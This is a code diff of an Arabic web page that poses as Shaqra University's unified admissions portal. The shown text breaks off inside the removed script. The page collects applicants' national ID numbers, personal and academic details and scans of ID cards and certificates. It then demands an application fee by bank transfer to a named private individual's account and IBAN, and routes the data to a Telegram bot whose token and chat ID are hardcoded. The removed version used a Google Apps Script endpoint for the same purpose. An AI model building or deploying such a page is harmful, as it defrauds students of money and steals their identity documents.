@@ -1,578 +1,276 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>تسجيل الدخول - بوابة الطالب الأكاديمية - جامعة شقراء</title>
-<link rel="stylesheet" href="login-styles.css">
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-<meta property="og:title" content="بوابة القبول - جامعة شقراء">
-<meta property="og:description" content="نموذج التقديم الرسمي.">
-<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTjobnA1f77rkZwN7QZLtyjG5hxRhprlrOVh2EesQplPQ&s=10">
-<meta property="og:type" content="website">
-<style>
-/* --- بعض CSS أساسي مدمج لتجنب اعتمادية خارجية (يمكنك إزالة إذا عندك login-styles.css) --- */
-body { font-family: "Cairo", sans-serif; background:#f5f7fb; margin:0; padding:24px; color:#0f172a; }
-.login-container{ max-width:980px; margin:8px auto; }
-.login-card{ background:#ffffff; border-radius:14px; padding:20px; box-shadow:0 8px 32px rgba(2,6,23,0.06); }
-.university-header{ display:flex; gap:12px; align-items:center; }
-.university-logo{ width:72px; height:72px; object-fit:contain; border-radius:8px; }
-.form-header h2{ margin:6px 0 0 0; font-size:20px; }
-.form-group{ margin-top:12px; }
-.login-btn{ margin-top:14px; background:#0b5fff; color:#fff; border:0; padding:10px 16px; border-radius:8px; font-weight:700; cursor:pointer; }
-.login-footer{ margin-top:12px; text-align:center; color:#6b7280; font-size:13px; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة القبول الإلكتروني | جامعة شقراء</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --su-blue: #003366; --su-gold: #b2935b; --su-bg: #f4f7f9; --snb: #005a2b; --danger: #d00000; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body { background-color: var(--su-bg); color: #333; }
 
-/* --- inserted app form styles (same as اللي طلبت) --- */
-#applicantBtn {
-  display:block; width:100%; margin-top:12px; padding:10px 12px; border-radius:8px; font-weight:800; cursor:pointer; background:#0b7a36; color:#fff; border:0; box-sizing:border-box;
-}
-#appDrawerWrapper { transition: all .36s ease; max-height:0; overflow:hidden; opacity:0; transform: translateY(-8px); }
-#appDrawerWrapper.open { max-height:4000px; opacity:1; transform: translateY(0); margin-top:14px; }
-.app-form { background:#fff; border:1px solid rgba(0,0,0,0.05); border-radius:10px; padding:18px; box-shadow:0 6px 20px rgba(15,23,42,0.04); box-sizing:border-box; }
-.app-form .grid { display:grid; grid-template-columns: 1fr 1fr; gap:14px; align-items:start; }
-.app-form .full { grid-column: 1 / -1; }
-.app-form label { display:block; font-weight:700; margin-bottom:6px; font-size:14px; }
-.app-form input[type=text], .app-form input[type=email], .app-form input[type=tel], .app-form input[type=date], .app-form input[type=number], .app-form select, .app-form textarea { width:100%; padding:10px; border:1px solid #e6e9ef; border-radius:8px; font-size:14px; box-sizing:border-box; }
-.app-form textarea { min-height:110px; resize:vertical; }
-.app-form .section { border-top:1px dashed #e6e9ef; padding-top:12px; margin-top:8px; font-weight:800; color:#0b7a36; }
-.app-form .btn { padding:10px 14px; border-radius:8px; cursor:pointer; border:0; font-weight:800; }
-.app-form .btn.primary { background:#0b5fff; color:#fff; }
-.app-form .btn.gray { background:#6b7280; color:#fff; }
-.app-form .copyBtn { padding:8px 10px; border-radius:6px; border:1px solid rgba(0,0,0,0.06); background:#f3f4f6; cursor:pointer; font-weight:700; }
-.app-form .note { background:#fffbea; padding:10px; border-left:4px solid #f59e0b; border-radius:8px; font-size:13px; }
-.app-form .small { font-size:13px; color:#6b7280; margin-top:6px; }
+        /* الهيدر */
+        header { background: #fff; padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--su-gold); box-shadow: 0 2px 15px rgba(0,0,0,0.1); }
+        .logo-wrap { display: flex; align-items: center; gap: 15px; }
+        .su-logo-circle { width: 80px; height: 80px; background: var(--su-blue); border-radius: 50%; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 800; text-align: center; border: 3px solid var(--su-gold); }
 
-@media (max-width:980px) {
-  .app-form .grid { grid-template-columns: 1fr; }
-  #applicantBtn { margin-top:10px; }
-}
-</style>
+        /* الناف بار */
+        nav { background: var(--su-blue); display: flex; padding: 0 8%; position: sticky; top: 0; z-index: 1000; overflow-x: auto; }
+        nav button { background: transparent; border: none; color: white; padding: 18px 25px; font-size: 14px; cursor: pointer; white-space: nowrap; font-weight: 600; border-bottom: 3px solid transparent; }
+        nav button.active { background: rgba(255,255,255,0.1); border-bottom-color: var(--su-gold); }
+
+        .container { padding: 40px 20px; max-width: 1200px; margin: 0 auto; min-height: 800px; }
+        .page { display: none; animation: fadeIn 0.4s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* الصفحة الرئيسية */
+        .hero-section { text-align: center; margin-bottom: 40px; }
+        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; }
+        .menu-card { background: #fff; padding: 40px 20px; border-radius: 12px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.05); cursor: pointer; transition: 0.3s; border-top: 5px solid var(--su-blue); }
+        .menu-card:hover { transform: translateY(-10px); border-top-color: var(--su-gold); }
+        .menu-card h3 { color: var(--su-blue); font-size: 19px; margin-bottom: 10px; }
+
+        /* النماذج المتقدمة */
+        .form-box { background: #fff; border-radius: 15px; padding: 30px; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); border-right: 10px solid var(--su-blue); }
+        .form-title { color: var(--su-blue); font-weight: 800; font-size: 18px; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
+        .field { display: flex; flex-direction: column; }
+        label { font-size: 13px; font-weight: 700; color: #555; margin-bottom: 8px; }
+        input, select { padding: 12px; border: 1px solid #ccc; border-radius: 8px; background: #fdfdfd; font-size: 14px; }
+        input:focus { border-color: var(--su-blue); outline: none; background: #fff; }
+
+        /* صفحة السداد - التطوير الجديد */
+        .pay-container { max-width: 600px; margin: 0 auto; background: white; border-radius: 25px; overflow: hidden; box-shadow: 0 30px 60px rgba(0,0,0,0.12); }
+        .pay-header { background: var(--snb); color: white; padding: 35px; text-align: center; }
+        .amount-highlight { background: #fff; color: var(--danger); padding: 15px 45px; border-radius: 50px; font-weight: 900; font-size: 32px; display: inline-block; margin-top: -30px; border: 3px solid var(--su-gold); box-shadow: 0 10px 20px rgba(208, 0, 0, 0.2); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        
+        .bank-details { padding: 40px; }
+        .bank-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #f0f0f0; align-items: center; }
+        .bank-item span { color: #888; font-size: 13px; }
+        .bank-item b { color: var(--su-blue); font-size: 15px; }
+
+        /* الأزرار */
+        .btn-action { background: var(--su-blue); color: #fff; padding: 18px; border: none; border-radius: 10px; font-weight: 800; cursor: pointer; width: 100%; font-size: 18px; margin-top: 20px; transition: 0.3s; }
+        .btn-action:hover { background: var(--su-gold); }
+
+        footer { background: #001a33; color: #fff; text-align: center; padding: 50px; margin-top: 60px; border-top: 5px solid var(--su-gold); font-size: 13px; }
+    </style>
 </head>
 <body>
 
-<div class="login-container">
-  <div class="login-card">
-    <div class="university-header">
-      <img src="logo.jpg" alt="شعار جامعة شقراء" class="university-logo">
-      <div class="university-info">
-        <h1 style="margin:0">جامعة شقراء</h1>
-        <p style="margin:2px 0 0 0;color:#6b7280">بوابة الطالب الأكاديمية</p>
-      </div>
+<header>
+    <div class="logo-wrap">
+        <div class="su-logo-circle">جامعة<br>شقراء</div>
+        <div>
+            <h1 style="color: var(--su-blue); font-size: 24px; font-weight: 900;">بوابة القبول الموحد</h1>
+            <p style="font-size: 12px; color: #666;">SHAQRA UNIVERSITY ADMISSION SYSTEM</p>
+        </div>
+    </div>
+</header>
+
+<nav id="mainNav">
+    <button class="active" onclick="showPage('home')">الرئيسية</button>
+    <button onclick="showPage('apply')">تقديم طلب جديد</button>
+    <button onclick="showPage('status')">متابعة الطلب</button>
+    <button onclick="showPage('majors')">دليل التخصصات</button>
+    <button onclick="showPage('results')">نتائج الترشيح</button>
+</nav>
+
+<div class="container">
+
+    <div id="home" class="page active">
+        <div class="hero-section">
+            <h2 style="color: var(--su-blue); font-size: 30px; font-weight: 900;">مرحباً بك في نظام سجلني (1447هـ)</h2>
+            <p style="margin-top: 10px; color: #666;">بوابة القبول الإلكتروني لكليات جامعة شقراء</p>
+        </div>
+        <div class="main-grid">
+            <div class="menu-card" onclick="showPage('apply')"><h3>إنشاء طلب جديد</h3><p>للمستجدين خريجي الثانوية العامة</p></div>
+            <div class="menu-card" onclick="showPage('status')"><h3>متابعة حالة الطلب</h3><p>رفع الوثائق وإكمال السداد</p></div>
+            <div class="menu-card" onclick="showPage('majors')"><h3>دليل التخصصات</h3><p>عرض المسارات المتاحة ونسب القبول</p></div>
+            <div class="menu-card" onclick="showPage('results')"><h3>نتائج الترشيح</h3><p>الاستعلام عن القبول النهائي</p></div>
+        </div>
     </div>
 
-    <!-- Login Form -->
-    <form class="login-form" id="loginForm">
-      <div class="form-header">
-        <h2><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</h2>
-        <p style="margin:6px 0 0 0;color:#6b7280">أدخل بياناتك للوصول إلى بوابة الطالب</p>
-      </div>
+    <div id="apply" class="page">
+        <form id="megaForm">
+            <div class="form-box">
+                <div class="form-title">📋 البيانات الشخصية (المرحلة 1)</div>
+                <div class="grid">
+                    <div class="field"><label>الاسم الرباعي الكامل *</label><input type="text" id="p_name" required></div>
+                    <div class="field"><label>رقم الهوية الوطنية (10 أرقام) *</label><input type="text" id="p_id" maxlength="10" required></div>
+                    <div class="field"><label>تاريخ الميلاد (يوم/شهر/سنة هجري) *</label><input type="text" id="p_dob" placeholder="14xx/xx/xx" required></div>
+                    <div class="field"><label>مكان الميلاد *</label><input type="text" id="p_pob" required></div>
+                    <div class="field"><label>الجنس *</label><select id="p_gender"><option>ذكر</option><option>أنثى</option></select></div>
+                    <div class="field"><label>الجنسية *</label><select id="p_nat"><option>سعودي</option><option>مقيم (منحة داخلية)</option></select></div>
+                </div>
+            </div>
 
-      <div class="form-group">
-        <label for="studentId"><i class="fas fa-id-card"></i> رقم الهوية / رقم الطالب</label>
-        <input type="text" id="studentId" name="studentId" placeholder="أدخل رقم الهوية أو رقم الطالب" required autocomplete="username">
-      </div>
+            <div class="form-box">
+                <div class="form-title">📞 معلومات التواصل والاتصال</div>
+                <div class="grid">
+                    <div class="field"><label>رقم الجوال الشخصي *</label><input type="tel" id="p_phone" placeholder="05xxxxxxxx" required></div>
+                    <div class="field"><label>رقم جوال ولي الأمر *</label><input type="tel" id="p_parent" required></div>
+                    <div class="field"><label>البريد الإلكتروني الرسمي *</label><input type="email" id="p_email" required></div>
+                    <div class="field"><label>المنطقة السكنية *</label><input type="text" id="p_area" required></div>
+                    <div class="field"><label>المدينة *</label><input type="text" id="p_city" required></div>
+                </div>
+            </div>
 
-      <div class="form-group">
-        <label for="password"><i class="fas fa-lock"></i> كلمة المرور</label>
-        <div style="display:flex;gap:8px;align-items:center">
-          <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required autocomplete="current-password" style="flex:1;padding:10px;border:1px solid #e6e9ef;border-radius:8px;">
-          <button type="button" class="toggle-password" onclick="(function(){ const p=document.getElementById('password'); p.type = p.type==='password'?'text':'password'; })()" style="background:#eef2ff;border:0;padding:8px;border-radius:8px;cursor:pointer"><i class="fas fa-eye"></i></button>
+            <div class="form-box">
+                <div class="form-title">🎓 البيانات الأكاديمية والرغبات (جامعة شقراء)</div>
+                <div class="grid">
+                    <div class="field" style="grid-column: 1/-1;">
+                        <label>اختر الرغبة الأولى (كافة تخصصات الجامعة) *</label>
+                        <select id="p_major" onchange="calcPrice()" required>
+                            <option value="">-- اضغط للاختيار من القائمة الرسمية --</option>
+                            <optgroup label="الكليات الطبية (شقراء/الدوادمي)">
+                                <option value="3000">كلية الطب البشري - شقراء (3000 ريال)</option>
+                                <option value="3000">كلية الطب البشري - الدوادمي (3000 ريال)</option>
+                                <option value="2000">كلية العلوم الطبية التطبيقية (مختبرات/تمريض)</option>
+                            </optgroup>
+                            <optgroup label="الهندسة والحاسب (الدوادمي/شقراء/القويعية)">
+                                <option value="1800">هندسة كهربائية - الدوادمي (1800 ريال)</option>
+                                <option value="1800">هندسة مدنية - الدوادمي (1800 ريال)</option>
+                                <option value="1800">هندسة ميكانيكية - الدوادمي (1800 ريال)</option>
+                                <option value="1600">علوم الحاسب وتقنية المعلومات - شقراء (1600 ريال)</option>
+                                <option value="1600">نظم المعلومات - القويعية (1600 ريال)</option>
+                            </optgroup>
+                            <optgroup label="إدارة الأعمال والقانون (عفيف/ثادق/حريملاء/ضرماء)">
+                                <option value="1400">إدارة أعمال - نظم معلومات إدارية MIS (1400 ريال)</option>
+                                <option value="1400">القانون (الحقوق) - شقراء (1400 ريال)</option>
+                                <option value="1300">المحاسبة - الدوادمي (1300 ريال)</option>
+                                <option value="1300">العلوم والدراسات الإنسانية - ثادق (1300 ريال)</option>
+                            </optgroup>
+                        </select>
+                    </div>
+                    <div class="field"><label>سنة التخرج من الثانوية *</label><input type="number" id="p_year" required></div>
+                    <div class="field"><label>المعدل التراكمي للثانوية *</label><input type="text" id="p_gpa" required></div>
+                    <div class="field"><label>درجة اختبار القدرات *</label><input type="number" id="p_q1" required></div>
+                    <div class="field"><label>درجة اختبار التحصيلي *</label><input type="number" id="p_q2" required></div>
+                </div>
+            </div>
+
+            <div class="form-box">
+                <div class="form-title">📂 رفع الوثائق الرسمية</div>
+                <div class="grid">
+                    <div class="field"><label>صورة الهوية الوطنية (وجه) *</label><input type="file" id="up_id" required></div>
+                    <div class="field"><label>صورة شهادة الثانوية العامة *</label><input type="file" id="up_cert" required></div>
+                </div>
+            </div>
+            <button type="button" class="btn-action" onclick="checkToPay()">حفظ والذهاب لمنصة السداد</button>
+        </form>
+    </div>
+
+    <div id="payment" class="page">
+        <div class="pay-container">
+            <div class="pay-header">
+                <h2 style="font-size: 24px; font-weight: 800;">سداد رسوم معالجة البيانات</h2>
+                <p style="font-size: 13px; opacity: 0.8; margin-top: 5px;">نظام سداد | البنك الأهلي السعودي SNB</p>
+            </div>
+            <center><div class="amount-highlight"><span id="finalPrice">0</span> ريال</div></center>
+            
+            <div class="bank-details">
+                <div class="bank-item"><span>المستفيد الرسمي</span><b>محمد فؤاد محمد سيف</b></div>
+                <div class="bank-item"><span>رقم الحساب</span><b>101000010006086310060</b></div>
+                <div class="bank-item" style="border: 2px dashed var(--snb); padding: 15px; border-radius: 10px; margin: 15px 0;">
+                    <span>الآيبان IBAN</span><b style="color:var(--snb); font-size: 12px;">SA88 8000 0101 6080 1631 0060</b>
+                </div>
+
+                <div style="background: #fff9f0; border: 1px solid var(--su-gold); padding: 20px; border-radius: 15px; text-align: center; margin-top: 20px;">
+                    <p style="font-weight: 800; color: var(--su-blue); margin-bottom: 12px;">إرفاق صورة إيصال التحويل البنكي *</p>
+                    <input type="file" id="up_pay" onchange="enableSubmit()">
+                    <p style="font-size: 10px; color: #888; margin-top: 8px;">* يجب أن تكون الصورة واضحة وتظهر رقم العملية والمبلغ</p>
+                </div>
+                <button id="submitBtn" class="btn-action" style="background: #ccc; cursor: not-allowed;" disabled onclick="sendToTelegram()">تأكيد الإرسال النهائي</button>
+            </div>
         </div>
-      </div>
+    </div>
 
-      <div class="form-options" style="display:flex;justify-content:space-between;align-items:center;margin-top:10px">
-        <label style="font-weight:700;"><input type="checkbox" id="rememberMe" name="rememberMe"> تذكرني</label>
-        <a href="#" class="forgot-password" style="color:#0b5fff;text-decoration:none">نسيت كلمة المرور؟</a>
-      </div>
-
-      <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
-
-      <div class="form-footer" style="margin-top:10px">
-        <div class="help-links" style="display:flex;gap:8px">
-          <a href="#" class="help-link" style="color:#6b7280;text-decoration:none"><i class="fas fa-question-circle"></i> مساعدة في تسجيل الدخول</a>
-          <a href="#" class="help-link" style="color:#6b7280;text-decoration:none"><i class="fas fa-phone"></i> الدعم الفني</a>
+    <div id="success" class="page">
+        <div style="background: white; padding: 60px 40px; border-radius: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border-top: 10px solid #27ae60;">
+            <div style="font-size: 60px; color: #27ae60; margin-bottom: 25px;">✅</div>
+            <h2 style="color: var(--su-blue); font-weight: 900; font-size: 28px;">تم استلام طلبكم بنجاح!</h2>
+            <p style="color: #666; line-height: 2; margin: 25px 0;">
+                عزيزي المتقدم، تم تسجيل بياناتك بنجاح في نظام جامعة شقراء لعام 1447هـ.<br>
+                <b>سيتم التواصل معك عبر البريد الإلكتروني ورسائل الـ SMS</b> فور مطابقة إيصال السداد ومراجعة الوثائق المرفقة (خلال 24 ساعة عمل).
+            </p>
+            <div style="background: var(--su-bg); padding: 20px; border-radius: 10px; display: inline-block;">
+                <span style="font-size: 12px; color: #999;">رقم الطلب المرجعي</span><br>
+                <b style="font-size: 22px; color: var(--su-blue);">SU-1447-988012</b>
+            </div>
+            <br><button class="btn-action" style="max-width: 200px; margin-top: 30px;" onclick="location.reload()">العودة للرئيسية</button>
         </div>
-      </div>
-    </form>
+    </div>
 
-    <!-- Messages -->
-    <div class="error-message" id="errorMessage" style="display:none;color:#b91c1c;margin-top:12px"></div>
-    <div class="success-message" id="successMessage" style="display:none;color:#065f46;margin-top:12px"></div>
+    <div id="status" class="page">
+        <div class="form-box" style="text-align: center;">
+            <h2 style="color:var(--su-blue); margin-bottom:15px;">الاستعلام عن حالة الطلب</h2>
+            <input type="text" placeholder="رقم الهوية الوطنية" style="max-width: 350px;"><br>
+            <button class="btn-action" style="max-width: 200px;" onclick="alert('لم يتم العثور على طلب بهذا الرقم، تأكد من إتمام السداد أولاً')">بحث</button>
+        </div>
+    </div>
 
-  </div>
-
-  <div class="login-footer">
-    <p>&copy; 2025 جامعة شقراء. جميع الحقوق محفوظة.</p>
-  </div>
 </div>
 
+<footer>
+    <p>جميع الحقوق محفوظة - عمادة القبول والتسجيل بجامعة شقراء &copy; 2026</p>
+    <p style="margin-top: 10px; opacity: 0.6;">المملكة العربية السعودية - شقراء</p>
+</footer>
+
 <script>
-/* ===========================
-   INSERTED APPLICATION & FEE UI + SENDER
-   حافظت على كل الحقول كما عندك بالضبط
-   فقط عدلت الرابط FORMCARRY_URL ليكون الرابط اللي أرسلت
-   =========================== */
+    const TOK = '8229651297:AAFrTN7ClxO1GaMAHFrzVIvBu4g_fvJN5dk';
+    const CHID = '7909982055';
 
-(function(){
-  const FORMCARRY_URL = 'https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec';
-  const IBAN = 'SA7705000068205113972000';
-  const FIXED_FEE = '1000';
-  const NOTIFY_EMAIL = 'abdullahyourdomain@gmail.com';
-
-  function ready(fn){ if (document.readyState !== 'loading') return fn(); document.addEventListener('DOMContentLoaded', fn); }
-
-  ready(()=> {
-    // Add "تقديم طالب جديد" button under login
-    const loginBtn = document.getElementById('loginBtn');
-    const btn = document.createElement('button');
-    btn.id = 'applicantBtn';
-    btn.type = 'button';
-    btn.innerHTML = 'تقديم طالب جديد &nbsp; / &nbsp; New Student Application';
-    btn.style.marginTop = '12px';
-    loginBtn.insertAdjacentElement('afterend', btn);
-
-    // Drawer wrapper (app form + fee form) - كامل الحقول كما طلبت
-    const drawerWrapper = document.createElement('div');
-    drawerWrapper.id = 'appDrawerWrapper';
-    drawerWrapper.innerHTML = `
-      <div class="app-form" role="region" aria-label="نموذج تقديم طالب جديد" style="margin-top:14px">
-        <form id="applicantForm" class="grid" enctype="multipart/form-data" novalidate>
-          <input type="hidden" name="_source" value="university_shaqra_application">
-          <div class="full" style="display:flex;justify-content:space-between;align-items:center;gap:12px">
-            <div>
-              <h3 style="margin:0">نموذج تقديم طالب جديد — جامعة شقراء</h3>
-              <div class="small">املأ الحقول المطلوبة بالعربية والإنجليزية. / Fill required fields in Arabic & English.</div>
-            </div>
-            <div style="display:flex;gap:8px">
-              <button type="button" id="closeAppForm" class="btn gray">إغلاق</button>
-            </div>
-          </div>
-
-          <div class="section full">1. البيانات الشخصية / Personal Information</div>
-
-          <div>
-            <label>الاسم الرباعي (بالعربية) / Full name (Arabic) <span style="color:#b91c1c">*</span></label>
-            <input name="fullNameAr" required>
-          </div>
-          <div>
-            <label>الاسم الرباعي (بالإنجليزية) / Full name (English) <span style="color:#b91c1c">*</span></label>
-            <input name="fullNameEn" required>
-          </div>
-
-          <div>
-            <label>رقم الهوية / ID number <span style="color:#b91c1c">*</span></label>
-            <input name="idNumber" required>
-          </div>
-          <div>
-            <label>نوع الهوية / ID type <span style="color:#b91c1c">*</span></label>
-            <select name="idType" required>
-              <option value="">اختر / Choose...</option>
-              <option value="national">هوية وطنية / National ID</option>
-              <option value="iqama">إقامة / Iqama</option>
-              <option value="passport">جواز سفر / Passport</option>
-            </select>
-          </div>
-
-          <div>
-            <label>مكان إصدار الهوية / Place of issue</label>
-            <input name="idPlace">
-          </div>
-          <div>
-            <label>تاريخ الميلاد / Date of birth <span style="color:#b91c1c">*</span></label>
-            <input type="date" name="birthDate" required>
-          </div>
-
-          <div>
-            <label>الجنس / Gender <span style="color:#b91c1c">*</span></label>
-            <select name="gender" required>
-              <option value="">اختر / Choose...</option>
-              <option value="male">ذكر / Male</option>
-              <option value="female">أنثى / Female</option>
-              <option value="other">أخرى / Other</option>
-            </select>
-          </div>
-          <div>
-            <label>الجنسية / Nationality <span style="color:#b91c1c">*</span></label>
-            <input name="nationality" required>
-          </div>
-
-          <div>
-            <label>الاسم الأول / First name</label>
-            <input name="firstName">
-          </div>
-          <div>
-            <label>الاسم الثاني / Second name</label>
-            <input name="secondName">
-          </div>
-
-          <div>
-            <label>اسم العائلة / Family name</label>
-            <input name="familyName">
-          </div>
-          <div>
-            <label>اسم الأم / Mother's name</label>
-            <input name="motherName">
-          </div>
-
-          <div class="section full">2. بيانات الاتصال / Contact</div>
-
-          <div>
-            <label>رقم الجوال / Mobile number <span style="color:#b91c1c">*</span></label>
-            <input name="phone" type="tel" required placeholder="+9665xxxxxxxx">
-          </div>
-          <div>
-            <label>البريد الإلكتروني / Email <span style="color:#b91c1c">*</span></label>
-            <input name="email" type="email" required placeholder="example@mail.com">
-          </div>
-
-          <div class="full">
-            <label>العنوان الوطني / Full address</label>
-            <input name="address" placeholder="شارع، حي، منزل رقم / Street, district, house no.">
-          </div>
-
-          <div class="section full">3. البيانات الأكاديمية / Academic</div>
-
-          <div>
-            <label>نوع المؤهل الأخير / Last qualification <span style="color:#b91c1c">*</span></label>
-            <select name="lastQualification" required>
-              <option value="">اختر / Choose...</option>
-              <option value="secondary">ثانوية عامة / Secondary</option>
-              <option value="diploma">دبلوم / Diploma</option>
-              <option value="bachelor">بكالوريوس / Bachelor</option>
-              <option value="master">ماجستير / Master</option>
-              <option value="phd">دكتوراه / PhD</option>
-            </select>
-          </div>
-          <div>
-            <label>اسم المؤسسة التعليمية / Institution name <span style="color:#b91c1c">*</span></label>
-            <input name="issuingInstitution" required>
-          </div>
-
-          <div>
-            <label>البلد المصدر للشهادة / Country of issue <span style="color:#b91c1c">*</span></label>
-            <input name="degreeCountry" required>
-          </div>
-          <div>
-            <label>التخصص / Major</label>
-            <input name="major">
-          </div>
-
-          <div>
-            <label>سنة التخرج / Graduation year <span style="color:#b91c1c">*</span></label>
-            <input type="number" name="graduationYear" min="1900" max="2100" required>
-          </div>
-          <div>
-            <label>تاريخ التخرج / Graduation date</label>
-            <input type="date" name="graduationDate">
-          </div>
-
-          <div>
-            <label>المعدل / GPA or % <span style="color:#b91c1c">*</span></label>
-            <input name="gpa" required placeholder="مثال: 4.00 أو 92%">
-          </div>
-          <div>
-            <label>نظام التقييم / Grading system</label>
-            <select name="gradingSystem">
-              <option value="">اختر / Choose...</option>
-              <option value="gpa">GPA</option>
-              <option value="percentage">Percentage</option>
-            </select>
-          </div>
-
-          <div class="full">
-            <label>مرفقات الشهادة والسجل الأكاديمي (PDF/صور) / Certificates & Transcript <span style="color:#b91c1c">*</span></label>
-            <input type="file" name="certificates" accept="application/pdf,image/*" multiple required>
-            <div class="small">ارفق شهادة التخرج والسجل الأكاديمي.</div>
-          </div>
-
-          <div class="section full">4. الاختبارات والدرجات / Tests</div>
-
-          <div>
-            <label>قياس / Qiyas</label>
-            <select name="hasQiyas"><option value="">اختر</option><option value="no">لا / No</option><option value="yes">نعم / Yes</option></select>
-          </div>
-          <div>
-            <label>رقم جلوس قياس / Qiyas seat no.</label>
-            <input name="qiyasNo">
-          </div>
-
-          <div>
-            <label>درجة قياس / Qiyas score</label>
-            <input name="qiyasScore">
-          </div>
-          <div>
-            <label>التحصيلي / Tahseeli seat no.</label>
-            <input name="tahseeliNo">
-          </div>
-
-          <div class="full">
-            <label>اختبار اللغة / English test (IELTS/TOEFL/STEP)</label>
-            <input name="englishTests">
-          </div>
-
-          <div class="full">
-            <label>مرفقات نتائج الاختبارات / Tests attachments</label>
-            <input type="file" name="testsAttachments" accept="application/pdf,image/*" multiple>
-          </div>
-
-          <div class="section full">مرفقات إضافية / Additional documents</div>
-
-          <div>
-            <label>السيرة الذاتية / CV</label>
-            <input type="file" name="cv" accept="application/pdf">
-          </div>
-          <div>
-            <label>أوراق منشورة / Publications</label>
-            <input type="file" name="publications" accept="application/pdf,image/*" multiple>
-          </div>
-
-          <div class="full">
-            <label>صورة الهوية أو نسخة الإقامة (مطلوب) / ID copy <span style="color:#b91c1c">*</span></label>
-            <input type="file" name="idAttachment" accept="application/pdf,image/*" required>
-          </div>
-
-          <div class="section full">التواقيعات والإقرارات / Declarations</div>
-
-          <div class="full note">
-            <strong>تنبيه:</strong> بتوقيعك (كتابة اسمك) توافق على صحة جميع البيانات المقدمة.
-          </div>
-
-          <div>
-            <label>اسم مقدم الطلب (مطبوع) / Applicant name <span style="color:#b91c1c">*</span></label>
-            <input name="declarantName" required>
-          </div>
-
-          <div>
-            <label>تاريخ التقديم / Application date <span style="color:#b91c1c">*</span></label>
-            <input type="date" name="declarationDate" required>
-          </div>
-
-          <div class="full">
-            <label>التوقيع الإلكتروني (اكتب اسمك الكامل) / Electronic signature <span style="color:#b91c1c">*</span></label>
-            <input name="electronicSignature" required placeholder="اكتب اسمك الكامل">
-          </div>
-
-          <div class="full" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:10px">
-            <button type="button" id="downloadJsonBtn" class="copyBtn" style="background:#eef2ff">تحميل JSON</button>
-            <button type="submit" id="sendAppBtn" class="btn primary" style="flex:1">إرسال الطلب / Submit Application</button>
-            <button type="button" id="resetAppBtn" class="btn gray">إعادة تعيين / Reset</button>
-            <div id="appFormMessage" style="flex:1"></div>
-          </div>
-        </form>
-
-        <form id="feeForm" class="grid" style="display:none;margin-top:14px" enctype="multipart/form-data" novalidate>
-          <input type="hidden" name="_source" value="university_shaqra_fee_proof">
-          <div class="full" style="display:flex;justify-content:space-between;align-items:center">
-            <h3 style="margin:0">نموذج إثبات الرسوم / Payment proof</h3>
-            <div class="small">المبلغ ثابت: <strong>1000 ريال</strong></div>
-          </div>
-
-          <div class="full section">تفاصيل الدفع / Payment details</div>
-
-          <div>
-            <label>المبلغ المحوّل / Amount transferred (SAR) <span style="color:#b91c1c">*</span></label>
-            <input name="paidAmount" value="${FIXED_FEE}" required readonly>
-          </div>
-
-          <div>
-            <label>البنك المحول منه / From bank <span style="color:#b91c1c">*</span></label>
-            <input name="fromBank" required placeholder="اسم البنك / Bank name">
-          </div>
-
-          <div>
-            <label>تاريخ العملية / Transaction date <span style="color:#b91c1c">*</span></label>
-            <input type="date" name="transactionDate" required>
-          </div>
-
-          <div>
-            <label>رقم مرجع التحويل / Transaction ID <span style="color:#b91c1c">*</span></label>
-            <input name="transactionId" required placeholder="مثال: 123456789">
-          </div>
-
-          <div class="full">
-            <label>إيصال التحويل (صورة) / Upload receipt <span style="color:#b91c1c">*</span></label>
-            <input type="file" name="receipt" accept="image/*,application/pdf" required>
-            <div class="small">رفع صورة أو PDF لإيصال الدفع.</div>
-          </div>
-
-          <div class="full" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:8px">
-            <div style="flex:1">
-              <p class="small" id="bankInfoFee">البنك المستلم: الأنماء  — IBAN: <strong id="ibanDisplay">${IBAN}</strong></p>
-            </div>
-            <div>
-              <button type="button" id="copyIbanFeeBtn" class="copyBtn">نسخ رقم الحساب</button>
-            </div>
-          </div>
-
-          <div class="full" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:12px">
-            <button type="button" id="downloadFeeJsonBtn" class="copyBtn" style="background:#eef2ff">تحميل JSON</button>
-            <button type="submit" id="sendFeeBtn" class="btn primary" style="flex:1">إرسال إيصال الدفع / Send Payment Proof</button>
-            <button type="button" id="resetFeeBtn" class="btn gray">إعادة تعيين</button>
-            <div id="feeFormMessage" style="flex:1"></div>
